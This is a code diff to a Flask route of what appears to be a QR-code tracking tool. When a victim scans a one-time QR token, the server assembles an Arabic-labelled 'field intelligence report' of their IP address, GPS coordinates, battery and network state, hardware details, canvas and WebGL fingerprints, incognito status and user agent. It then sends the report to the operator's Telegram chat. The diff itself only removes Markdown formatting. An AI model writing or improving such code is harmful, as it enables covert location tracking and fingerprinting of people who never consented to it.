@@ -54,7 +54,6 @@ def init_qr_routes(app, bot):
                 print(f"[-] Token '{token}' not found or expired in Redis!")
                 return jsonify({"status": "error", "message": "Token expired or invalid"}), 404
 
-            # حذف الـ Token بعد إيجاده لمرة واحدة فقط
             redis_client.delete(redis_key)
 
             source_ip = (
@@ -72,31 +71,32 @@ def init_qr_routes(app, bot):
             screen = data.get('screen', {})
             fingerprint = data.get('fingerprint', {})
 
+            # كتابة الرسالة كنص عادي تماماً (Plain Text) لتجنب أي أخطاء في الرموز الخاصة
             msg = (
-                "🎯🔥 **[تقرير استخبارات الـ QR الميدانية]**\n"
+                "🎯🔥 [تقرير استخبارات الـ QR الميدانية]\n"
                 "--------------------------------------------------\n"
-                f"🌍 **عنوان الـ IP الخارجي:** `{source_ip}`\n"
-                f"📍 **إحداثيات الموقع (GPS):**\n"
-                f"   • خط العرض: `{geo.get('latitude', 'مرفوض/غير متاح')}`\n"
-                f"   • خط الطول: `{geo.get('longitude', 'مرفوض/غير متاح')}`\n"
-                f"   • الدقة: `{geo.get('accuracy', 'N/A')} متر`\n"
-                f"🔋 **حالة البطارية:** `{battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}`\n"
-                f"📶 **نوع شبكة الاتصال:** `{network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps`\n"
-                f"💻 **نظام التشغيل والمعمارية:** `{data.get('platform', 'Unknown')}`\n"
-                f"🧠 **معمارية المعالج:** `{fingerprint.get('cpu_architecture', 'N/A')}`\n"
-                f"💾 **ذاكرة الجهاز:** `{fingerprint.get('device_memory', 'N/A')} GB`\n"
-                f"📐 **دقة الشاشة والعمق:** `{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)`\n"
-                f"🎨 **بصمة Canvas:** `{fingerprint.get('canvas_hash', 'N/A')}`\n"
-                f"🖼️ **بصمة WebGL:** `{fingerprint.get('webgl_hash', 'N/A')}`\n"
-                f"🌐 **اللغة المحلية:** `{fingerprint.get('language', 'N/A')}`\n"
-                f"⏳ **المنطقة الزمنية:** `{fingerprint.get('timezone', 'N/A')}`\n"
-                f"🕵️ **وضع التصفح الخفي:** `{fingerprint.get('incognito_mode', 'N/A')}`\n"
-                f"⚙️ **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
+                f"🌍 عنوان الـ IP الخارجي: {source_ip}\n"
+                "📍 إحداثيات الموقع (GPS):\n"
+                f"   • خط العرض: {geo.get('latitude', 'مرفوض/غير متاح')}\n"
+                f"   • خط الطول: {geo.get('longitude', 'مرفوض/غير متاح')}\n"
+                f"   • الدقة: {geo.get('accuracy', 'N/A')} متر\n"
+                f"🔋 حالة البطارية: {battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}\n"
+                f"📶 نوع شبكة الاتصال: {network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps\n"
+                f"💻 نظام التشغيل والمعمارية: {data.get('platform', 'Unknown')}\n"
+                f"🧠 معمارية المعالج: {fingerprint.get('cpu_architecture', 'N/A')}\n"
+                f"💾 ذاكرة الجهاز: {fingerprint.get('device_memory', 'N/A')} GB\n"
+                f"📐 دقة الشاشة والعمق: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)\n"
+                f"🎨 بصمة Canvas: {fingerprint.get('canvas_hash', 'N/A')}\n"
+                f"🖼️ بصمة WebGL: {fingerprint.get('webgl_hash', 'N/A')}\n"
+                f"🌐 اللغة المحلية: {fingerprint.get('language', 'N/A')}\n"
+                f"⏳ المنطقة الزمنية: {fingerprint.get('timezone', 'N/A')}\n"
+                f"🕵️ وضع التصفح الخفي: {fingerprint.get('incognito_mode', 'N/A')}\n"
+                f"⚙️ بصمة المتصفح (UserAgent):\n{data.get('userAgent', 'N/A')}\n"
                 "--------------------------------------------------"
             )
             
             try:
-                bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
+                bot.send_message(owner_chat_id, msg)
                 print(f"[+] Report successfully dispatched to Telegram chat ID: {owner_chat_id}")
             except Exception as bot_err:
                 print(f"[-] Telegram dispatch error: {bot_err}")
